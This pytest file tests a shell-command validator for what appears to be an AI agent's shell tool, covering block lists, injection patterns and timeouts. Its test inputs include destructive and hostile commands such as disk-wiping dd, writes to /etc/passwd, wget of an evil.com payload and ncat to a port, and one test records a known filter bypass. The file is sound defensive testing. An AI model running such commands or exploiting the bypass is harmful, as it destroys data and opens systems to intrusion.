"""
Tests for the shell execution tool.

Covers command validation (dangerous commands, shell injection patterns,
whitelist/blocklist modes, malformed input) and ShellTool.execute()
(successful execution, failures, timeouts, validation rejections).
"""

import asyncio
import sys
import types
from typing import Any
from unittest.mock import MagicMock

import pytest

# ---------------------------------------------------------------------------
# Mock missing third-party LLM provider SDKs before importing shell tool.
# The import chain is:  shell.tool -> ungula.skills -> ungula.skills.compatibility
#   -> ungula.llm.base -> ungula.llm.__init__ -> anthropic / openai / google.
# ---------------------------------------------------------------------------

_MOCK_MODULES = ["anthropic", "openai", "httpx"]
_MOCK_GOOGLE_SUBS = ["google.generativeai", "google.genai", "google.genai.types"]

for _mod in _MOCK_MODULES:
    if _mod not in sys.modules:
        sys.modules[_mod] = MagicMock()

if "google" not in sys.modules:
    _google_mock = types.ModuleType("google")
    _google_mock.__path__ = []  # type: ignore[attr-defined]
    sys.modules["google"] = _google_mock

for _sub in _MOCK_GOOGLE_SUBS:
    if _sub not in sys.modules:
        sys.modules[_sub] = MagicMock()

# Now safe to import ---
from ungula.config import ShellToolConfig
from ungula.skills.builtin.shell.tool import (
    DANGEROUS_BASE_COMMANDS,
    ShellTool,
    _SHELL_INJECTION_PATTERNS,
    validate_command,
)
from ungula.tools.base import ToolResult


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def default_config() -> ShellToolConfig:
    """ShellToolConfig with default settings (no whitelist, default blocklist)."""
    return ShellToolConfig()


@pytest.fixture
def empty_blocklist_config() -> ShellToolConfig:
    """ShellToolConfig with empty blocked_commands list (no custom blocks)."""
    return ShellToolConfig(blocked_commands=[])


@pytest.fixture
def whitelist_config() -> ShellToolConfig:
    """ShellToolConfig that only allows specific commands."""
    return ShellToolConfig(
        allowed_commands=["echo", "python --version", "ls"],
        blocked_commands=[],
    )


@pytest.fixture
def custom_blocked_config() -> ShellToolConfig:
    """ShellToolConfig with additional custom blocked patterns."""
    return ShellToolConfig(
        blocked_commands=["rm -rf /", "sudo rm", "mkfs", "dd if=", "> /dev/", "my_secret_tool"],
    )


@pytest.fixture
def shell_tool(empty_blocklist_config: ShellToolConfig) -> ShellTool:
    """ShellTool instance with a clean config (empty blocklist)."""
    return ShellTool(config=empty_blocklist_config)


@pytest.fixture
def shell_tool_default(default_config: ShellToolConfig) -> ShellTool:
    """ShellTool instance with default config."""
    return ShellTool(config=default_config)


# ===========================================================================
# validate_command - Empty / basic commands
# ===========================================================================


class TestValidateCommandBasic:
    """Test validate_command with empty and simple inputs."""

    def test_empty_command(self, default_config: ShellToolConfig):
        assert validate_command("", default_config) == "No command provided"

    def test_simple_echo(self, empty_blocklist_config: ShellToolConfig):
        assert validate_command("echo hello", empty_blocklist_config) is None

    def test_simple_ls(self, empty_blocklist_config: ShellToolConfig):
        assert validate_command("ls -la", empty_blocklist_config) is None

    def test_python_version(self, empty_blocklist_config: ShellToolConfig):
        assert validate_command("python --version", empty_blocklist_config) is None

    def test_pwd(self, empty_blocklist_config: ShellToolConfig):
        assert validate_command("pwd", empty_blocklist_config) is None

    def test_cat_file(self, empty_blocklist_config: ShellToolConfig):
        assert validate_command("cat /tmp/test.txt", empty_blocklist_config) is None

    def test_date_command(self, empty_blocklist_config: ShellToolConfig):
        assert validate_command("date", empty_blocklist_config) is None

    def test_whoami(self, empty_blocklist_config: ShellToolConfig):
        assert validate_command("whoami", empty_blocklist_config) is None


# ===========================================================================
# validate_command - Dangerous base commands
# ===========================================================================


class TestValidateCommandDangerous:
    """Test that every command in DANGEROUS_BASE_COMMANDS is rejected."""

    @pytest.mark.parametrize("cmd", sorted(DANGEROUS_BASE_COMMANDS))
    def test_dangerous_base_command_bare(self, cmd: str, empty_blocklist_config: ShellToolConfig):
        """Each dangerous command by itself should be rejected."""
        result = validate_command(cmd, empty_blocklist_config)
        assert result is not None, f"'{cmd}' should be blocked"
        assert "not allowed" in result

    @pytest.mark.parametrize("cmd", sorted(DANGEROUS_BASE_COMMANDS))
    def test_dangerous_base_command_with_args(self, cmd: str, empty_blocklist_config: ShellToolConfig):
        """Each dangerous command with arguments should be rejected."""
        result = validate_command(f"{cmd} --flag arg1 arg2", empty_blocklist_config)
        assert result is not None, f"'{cmd} --flag arg1 arg2' should be blocked"
        assert "not allowed" in result

    def test_rm_explicitly(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("rm file.txt", empty_blocklist_config)
        assert result is not None
        assert "'rm' is not allowed" in result

    def test_rmdir_explicitly(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("rmdir /tmp/testdir", empty_blocklist_config)
        assert result is not None

    def test_curl_explicitly(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("curl https://example.com", empty_blocklist_config)
        assert result is not None

    def test_wget_explicitly(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("wget https://example.com", empty_blocklist_config)
        assert result is not None

    def test_shutdown(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("shutdown -h now", empty_blocklist_config)
        assert result is not None

    def test_reboot(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("reboot", empty_blocklist_config)
        assert result is not None

    def test_dd(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("dd if=/dev/zero of=/dev/sda", empty_blocklist_config)
        assert result is not None

    def test_mkfs_bare(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("mkfs /dev/sda1", empty_blocklist_config)
        assert result is not None

    def test_mkfs_ext4_with_default_blocklist(self, default_config: ShellToolConfig):
        """mkfs.ext4 is not in DANGEROUS_BASE_COMMANDS (which has 'mkfs'),
        but the default config blocked_commands includes 'mkfs' as a
        substring pattern, so it gets caught at that level."""
        result = validate_command("mkfs.ext4 /dev/sda1", default_config)
        assert result is not None
        assert "blocked" in result.lower()

    def test_mkfs_ext4_bypasses_base_check(self, empty_blocklist_config: ShellToolConfig):
        """Without a blocklist, mkfs.ext4 slips past because the base command
        extraction yields 'mkfs.ext4', not 'mkfs'. This documents the gap."""
        result = validate_command("mkfs.ext4 /dev/sda1", empty_blocklist_config)
        # With empty blocklist, mkfs.ext4 is NOT caught (known limitation)
        assert result is None

    def test_netcat(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("nc -l 8080", empty_blocklist_config)
        assert result is not None

    def test_ncat(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("ncat 192.168.1.1 4444", empty_blocklist_config)
        assert result is not None

    def test_mount(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("mount /dev/sda1 /mnt", empty_blocklist_config)
        assert result is not None

    def test_systemctl(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("systemctl stop nginx", empty_blocklist_config)
        assert result is not None

    def test_crontab(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("crontab -e", empty_blocklist_config)
        assert result is not None

    def test_iptables(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("iptables -F", empty_blocklist_config)
        assert result is not None

    def test_passwd(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("passwd root", empty_blocklist_config)
        assert result is not None

    def test_useradd(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("useradd hacker", empty_blocklist_config)
        assert result is not None

    def test_chroot(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("chroot /newroot", empty_blocklist_config)
        assert result is not None


# ===========================================================================
# validate_command - Full path to dangerous commands
# ===========================================================================


class TestValidateCommandFullPath:
    """Test that dangerous commands are caught even when given as full paths."""

    def test_full_path_rm(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("/usr/bin/rm file.txt", empty_blocklist_config)
        assert result is not None
        assert "'rm' is not allowed" in result

    def test_full_path_curl(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("/usr/bin/curl https://evil.com", empty_blocklist_config)
        assert result is not None
        assert "'curl' is not allowed" in result

    def test_full_path_dd(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("/bin/dd if=/dev/zero of=/tmp/f", empty_blocklist_config)
        assert result is not None

    def test_full_path_shutdown(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("/sbin/shutdown -h now", empty_blocklist_config)
        assert result is not None

    def test_full_path_wget(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("/usr/local/bin/wget http://evil.com/payload", empty_blocklist_config)
        assert result is not None

    def test_full_path_netcat(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("/usr/bin/netcat -l 4444", empty_blocklist_config)
        assert result is not None


# ===========================================================================
# validate_command - Shell injection patterns
# ===========================================================================


class TestValidateCommandInjection:
    """Test that shell injection patterns are detected and rejected."""

    def test_command_substitution_dollar(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("echo $(whoami)", empty_blocklist_config)
        assert result is not None
        assert "disallowed" in result.lower() or "metacharacter" in result.lower()

    def test_command_substitution_backtick(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("echo `whoami`", empty_blocklist_config)
        assert result is not None

    def test_logical_or(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("false || echo pwned", empty_blocklist_config)
        assert result is not None

    def test_logical_and(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("true && echo pwned", empty_blocklist_config)
        assert result is not None

    def test_semicolon_separator(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("echo hello; echo pwned", empty_blocklist_config)
        assert result is not None

    def test_sudo(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("sudo ls /root", empty_blocklist_config)
        assert result is not None

    def test_su(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("su - root", empty_blocklist_config)
        assert result is not None

    def test_eval(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("eval 'echo pwned'", empty_blocklist_config)
        assert result is not None

    def test_exec(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("exec /bin/sh", empty_blocklist_config)
        assert result is not None

    def test_source(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("source /etc/profile", empty_blocklist_config)
        assert result is not None

    def test_redirect_to_dev(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("echo x > /dev/sda", empty_blocklist_config)
        assert result is not None

    def test_redirect_to_etc(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("echo x > /etc/passwd", empty_blocklist_config)
        assert result is not None

    def test_redirect_to_proc(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("echo x > /proc/sysrq-trigger", empty_blocklist_config)
        assert result is not None

    def test_redirect_to_sys(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("echo x > /sys/something", empty_blocklist_config)
        assert result is not None

    def test_redirect_to_boot(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("echo x > /boot/vmlinuz", empty_blocklist_config)
        assert result is not None

    def test_redirect_to_dev_with_spaces(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("echo x >   /dev/null", empty_blocklist_config)
        assert result is not None

    def test_nested_injection_in_args(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("echo $(cat /etc/passwd)", empty_blocklist_config)
        assert result is not None

    def test_sudo_in_middle(self, empty_blocklist_config: ShellToolConfig):
        """sudo should be caught by word boundary even mid-command."""
        result = validate_command("echo hello sudo rm -rf /", empty_blocklist_config)
        assert result is not None

    def test_injection_pattern_regex_directly(self):
        """Verify the compiled regex matches known patterns."""
        assert _SHELL_INJECTION_PATTERNS.search("$(cmd)") is not None
        assert _SHELL_INJECTION_PATTERNS.search("`cmd`") is not None
        assert _SHELL_INJECTION_PATTERNS.search("a || b") is not None
        assert _SHELL_INJECTION_PATTERNS.search("a && b") is not None
        assert _SHELL_INJECTION_PATTERNS.search("a ; b") is not None
        assert _SHELL_INJECTION_PATTERNS.search("sudo ls") is not None
        assert _SHELL_INJECTION_PATTERNS.search("su root") is not None
        assert _SHELL_INJECTION_PATTERNS.search("eval cmd") is not None
        assert _SHELL_INJECTION_PATTERNS.search("exec cmd") is not None
        assert _SHELL_INJECTION_PATTERNS.search("source file") is not None
        assert _SHELL_INJECTION_PATTERNS.search("> /dev/sda") is not None
        assert _SHELL_INJECTION_PATTERNS.search("> /etc/passwd") is not None
        assert _SHELL_INJECTION_PATTERNS.search("> /proc/x") is not None
        assert _SHELL_INJECTION_PATTERNS.search("> /sys/x") is not None
        assert _SHELL_INJECTION_PATTERNS.search("> /boot/x") is not None

    def test_clean_commands_do_not_match_injection_regex(self):
        """Ensure normal commands do not trigger injection detection."""
        assert _SHELL_INJECTION_PATTERNS.search("echo hello") is None
        assert _SHELL_INJECTION_PATTERNS.search("ls -la /tmp") is None
        assert _SHELL_INJECTION_PATTERNS.search("python --version") is None
        assert _SHELL_INJECTION_PATTERNS.search("cat file.txt") is None
        assert _SHELL_INJECTION_PATTERNS.search("grep pattern file") is None


# ===========================================================================
# validate_command - Custom blocked patterns from config
# ===========================================================================


class TestValidateCommandBlocked:
    """Test config-level blocked_commands patterns."""

    def test_default_blocklist_rm_rf_root(self, default_config: ShellToolConfig):
        """'rm -rf /' is in default blocked_commands, but 'rm' is also in
        DANGEROUS_BASE_COMMANDS, so it gets caught at that level first."""
        result = validate_command("rm -rf /", default_config)
        assert result is not None

    def test_custom_blocked_pattern(self, custom_blocked_config: ShellToolConfig):
        result = validate_command("my_secret_tool --flag", custom_blocked_config)
        assert result is not None
        assert "blocked" in result.lower()

    def test_blocked_pattern_substring_match(self, custom_blocked_config: ShellToolConfig):
        """blocked_commands uses substring ('in' operator) matching."""
        result = validate_command("echo dd if=something", custom_blocked_config)
        # "dd if=" is in blocked list and appears as substring
        assert result is not None

    def test_unblocked_command_with_custom_config(self, custom_blocked_config: ShellToolConfig):
        result = validate_command("echo hello world", custom_blocked_config)
        assert result is None


# ===========================================================================
# validate_command - Whitelist mode
# ===========================================================================


class TestValidateCommandWhitelist:
    """Test whitelist (allowed_commands) mode."""

    def test_allowed_command_passes(self, whitelist_config: ShellToolConfig):
        assert validate_command("echo hello", whitelist_config) is None

    def test_allowed_command_prefix_match(self, whitelist_config: ShellToolConfig):
        """allowed_commands checks startswith prefix."""
        assert validate_command("python --version", whitelist_config) is None

    def test_ls_allowed(self, whitelist_config: ShellToolConfig):
        assert validate_command("ls -la", whitelist_config) is None

    def test_disallowed_command_in_whitelist_mode(self, whitelist_config: ShellToolConfig):
        result = validate_command("cat /etc/passwd", whitelist_config)
        assert result is not None
        assert "not in allowed list" in result

    def test_grep_not_in_whitelist(self, whitelist_config: ShellToolConfig):
        result = validate_command("grep pattern file.txt", whitelist_config)
        assert result is not None
        assert "not in allowed list" in result

    def test_dangerous_command_still_blocked_in_whitelist(self):
        """Even if curl is in allowed_commands, it hits DANGEROUS_BASE_COMMANDS first."""
        config = ShellToolConfig(
            allowed_commands=["curl"],
            blocked_commands=[],
        )
        result = validate_command("curl https://example.com", config)
        # curl is in DANGEROUS_BASE_COMMANDS, checked before whitelist
        assert result is not None
        assert "'curl' is not allowed" in result

    def test_injection_blocked_before_whitelist(self):
        """Injection patterns are checked before whitelist."""
        config = ShellToolConfig(
            allowed_commands=["echo"],
            blocked_commands=[],
        )
        result = validate_command("echo $(whoami)", config)
        assert result is not None
        assert "metacharacter" in result.lower() or "disallowed" in result.lower()


# ===========================================================================
# validate_command - Malformed commands
# ===========================================================================


class TestValidateCommandMalformed:
    """Test malformed command handling."""

    def test_unbalanced_single_quotes(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command("echo 'hello", empty_blocklist_config)
        assert result is not None
        assert "malformed" in result.lower()

    def test_unbalanced_double_quotes(self, empty_blocklist_config: ShellToolConfig):
        result = validate_command('echo "hello', empty_blocklist_config)
        assert result is not None
        assert "malformed" in result.lower()

    def test_whitespace_only(self, empty_blocklist_config: ShellToolConfig):
        """Whitespace-only input: shlex.split returns empty list."""
        result = validate_command("   ", empty_blocklist_config)
        # Injection check passes (no patterns), shlex.split("   ") => []
        assert result is not None
        assert "empty" in result.lower()


# ===========================================================================
# ShellTool.execute - Successful commands
# ===========================================================================


class TestShellToolExecuteSuccess:
    """Tests for ShellTool.execute with commands that should succeed."""

    @pytest.mark.asyncio
    async def test_echo_hello(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="echo hello")
        assert result.success is True
        assert "hello" in result.output

    @pytest.mark.asyncio
    async def test_echo_with_spaces(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="echo 'hello world'")
        assert result.success is True
        assert "hello world" in result.output

    @pytest.mark.asyncio
    async def test_return_code_zero(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="echo ok")
        assert result.data.get("return_code") == 0

    @pytest.mark.asyncio
    async def test_python_version(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="python3 --version")
        assert result.success is True
        assert "python" in result.output.lower() or "Python" in result.output

    @pytest.mark.asyncio
    async def test_no_output_command(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="true")
        assert result.success is True
        # "true" produces no output, but we should get "(no output)"
        assert result.output == "(no output)"

    @pytest.mark.asyncio
    async def test_multiword_echo(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="echo one two three")
        assert result.success is True
        assert "one two three" in result.output

    @pytest.mark.asyncio
    async def test_command_whitespace_stripped(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="  echo stripped  ")
        assert result.success is True
        assert "stripped" in result.output


# ===========================================================================
# ShellTool.execute - Failed commands
# ===========================================================================


class TestShellToolExecuteFailure:
    """Tests for ShellTool.execute with commands that fail."""

    @pytest.mark.asyncio
    async def test_nonexistent_command(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="nonexistent_command_xyz123")
        assert result.success is False
        assert result.error is not None

    @pytest.mark.asyncio
    async def test_false_command_returns_error(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="false")
        assert result.success is False
        assert result.data.get("return_code") != 0

    @pytest.mark.asyncio
    async def test_exit_nonzero(self, shell_tool: ShellTool):
        """A command that exits with a non-zero code should report failure."""
        result = await shell_tool.execute(command="python3 -c 'import sys; sys.exit(42)'")
        assert result.success is False
        assert result.error is not None


# ===========================================================================
# ShellTool.execute - Timeout handling
# ===========================================================================


class TestShellToolExecuteTimeout:
    """Tests for ShellTool.execute timeout behavior."""

    @pytest.mark.asyncio
    async def test_timeout_triggers(self):
        """A long-running command should be killed after timeout."""
        config = ShellToolConfig(
            blocked_commands=[],
            max_timeout=2,
        )
        tool = ShellTool(config=config)
        result = await tool.execute(command="sleep 60", timeout=1)
        assert result.success is False
        assert "timed out" in result.error.lower()

    @pytest.mark.asyncio
    async def test_timeout_clamped_to_max(self):
        """Requested timeout exceeding max_timeout should be clamped."""
        config = ShellToolConfig(
            blocked_commands=[],
            max_timeout=5,
        )
        tool = ShellTool(config=config)
        # Request 100s timeout, but max is 5s; sleep 60 should still timeout
        result = await tool.execute(command="sleep 60", timeout=100)
        assert result.success is False
        assert "timed out" in result.error.lower()

    @pytest.mark.asyncio
    async def test_default_timeout(self, shell_tool: ShellTool):
        """Fast command with default timeout should succeed."""
        result = await shell_tool.execute(command="echo fast")
        assert result.success is True


# ===========================================================================
# ShellTool.execute - Validation rejection
# ===========================================================================


class TestShellToolExecuteValidation:
    """Tests for ShellTool.execute when validation rejects the command."""

    @pytest.mark.asyncio
    async def test_empty_command_rejected(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="")
        assert result.success is False
        assert result.error is not None
        assert "no command" in result.error.lower()

    @pytest.mark.asyncio
    async def test_dangerous_command_rejected(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="rm -rf /tmp/test")
        assert result.success is False
        assert "not allowed" in result.error.lower()

    @pytest.mark.asyncio
    async def test_injection_rejected(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="echo $(whoami)")
        assert result.success is False
        assert "disallowed" in result.error.lower() or "metacharacter" in result.error.lower()

    @pytest.mark.asyncio
    async def test_sudo_rejected(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="sudo ls")
        assert result.success is False

    @pytest.mark.asyncio
    async def test_semicolon_rejected(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="ls; rm -rf /")
        assert result.success is False

    @pytest.mark.asyncio
    async def test_curl_rejected(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="curl https://example.com")
        assert result.success is False

    @pytest.mark.asyncio
    async def test_result_has_empty_output_on_validation_fail(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="rm file.txt")
        assert result.success is False
        assert result.output == ""

    @pytest.mark.asyncio
    async def test_whitespace_only_command_rejected(self, shell_tool: ShellTool):
        result = await shell_tool.execute(command="   ")
        assert result.success is False


# ===========================================================================
# ShellTool - Metadata and schema
# ===========================================================================


class TestShellToolMeta:
    """Tests for ShellTool metadata and schema."""

    def test_tool_name(self, shell_tool: ShellTool):
        assert shell_tool.name == "shell_exec"

    def test_tool_description(self, shell_tool: ShellTool):
        assert "shell command" in shell_tool.description.lower()

    def test_tool_parameters(self, shell_tool: ShellTool):
        assert len(shell_tool.parameters) == 2
        names = [p.name for p in shell_tool.parameters]
        assert "command" in names
        assert "timeout" in names

    def test_schema_structure(self, shell_tool: ShellTool):
        schema = shell_tool.get_schema()
        assert schema["type"] == "function"
        func = schema["function"]
        assert func["name"] == "shell_exec"
        props = func["parameters"]["properties"]
        assert "command" in props
        assert "timeout" in props
        assert "command" in func["parameters"]["required"]
        # timeout is optional
        assert "timeout" not in func["parameters"]["required"]


# ===========================================================================
# ShellTool.execute - Working directory
# ===========================================================================


class TestShellToolWorkingDir:
    """Tests for ShellTool.execute with custom working directory."""

    @pytest.mark.asyncio
    async def test_working_dir_is_used(self, tmp_path):
        config = ShellToolConfig(
            blocked_commands=[],
            working_dir=str(tmp_path),
        )
        tool = ShellTool(config=config)
        result = await tool.execute(command="pwd")
        assert result.success is True
        assert str(tmp_path) in result.output

    @pytest.mark.asyncio
    async def test_no_working_dir_uses_default(self):
        config = ShellToolConfig(
            blocked_commands=[],
            working_dir=None,
        )
        tool = ShellTool(config=config)
        result = await tool.execute(command="echo test_wd")
        assert result.success is True
        assert "test_wd" in result.output


# ===========================================================================
# DANGEROUS_BASE_COMMANDS completeness
# ===========================================================================


class TestDangerousBaseCommands:
    """Tests to ensure DANGEROUS_BASE_COMMANDS is properly defined."""

    def test_is_frozenset(self):
        assert isinstance(DANGEROUS_BASE_COMMANDS, frozenset)

    def test_contains_expected_commands(self):
        expected = {
            "rm", "rmdir", "mkfs", "dd", "fdisk", "parted",
            "shutdown", "reboot", "halt", "poweroff", "init",
            "passwd", "useradd", "userdel", "usermod", "groupadd", "groupdel",
            "mount", "umount", "chroot",
            "iptables", "ip6tables", "nft",
            "systemctl", "service",
            "crontab",
            "nc", "ncat", "netcat",
            "curl", "wget",
        }
        assert expected == DANGEROUS_BASE_COMMANDS

    def test_not_mutable(self):
        """frozenset should prevent accidental mutation."""
        with pytest.raises(AttributeError):
            DANGEROUS_BASE_COMMANDS.add("newcmd")  # type: ignore[attr-defined]
